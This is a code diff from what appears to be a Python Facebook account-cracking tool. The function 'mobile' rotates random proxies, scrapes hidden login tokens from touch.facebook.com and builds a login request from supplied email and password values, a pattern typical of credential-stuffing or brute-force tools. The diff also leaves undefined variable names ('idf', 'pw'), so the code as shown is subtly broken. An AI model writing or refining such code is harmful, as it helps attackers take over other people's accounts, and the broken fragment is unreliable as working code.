@@ -1600,31 +1600,27 @@ def mobile(uid,pwx,tl):
             nip=random.choice(xvx)
             proxs= {'http': nip}
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com/').text
+            free_fb = Session.get('https://touch.facebook.com/')
             data ={
-            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': uid,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'false',
-            'is_smart_lock': 'true',
-            'bi_xrwh': '0',
-            'pass': pw,
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'dyn': '',
-            'csr': '',
-            'req': '5',
-            'a': '',
-            '__user': '0',
-            '_fb_noscript': 'true'}
+'lsd': re.search('name="lsd" value="(.*?)"',str(free_fb.text)).group(1),
+'jazoest': re.search('name="jazoest" value="(.*?)"',str(free_fb.text)).group(1),
+'m_ts': re.search('name="m_ts" value="(.*?)"',str(free_fb.text)).group(1),
+'li': re.search('name="li" value="(.*?)"',str(free_fb.text)).group(1),
+'try_number': 0,
+'unrecognized_tries': 0,
+'email':idf,
+'pass':pw,
+'login':'Masuk',
+'prefill_contact_point': '',
+'prefill_source': '',
+'prefill_type': '',
+'first_prefill_source': '',
+'first_prefill_type': '',
+'had_cp_prefilled': False,
+'had_password_prefilled': False,
+'is_smart_lock': False,
+'bi_xrwh': 0
+}
             headers = {'authority':'mbasic.facebook.com',
             'method': 'POST',
             'scheme': 'https',
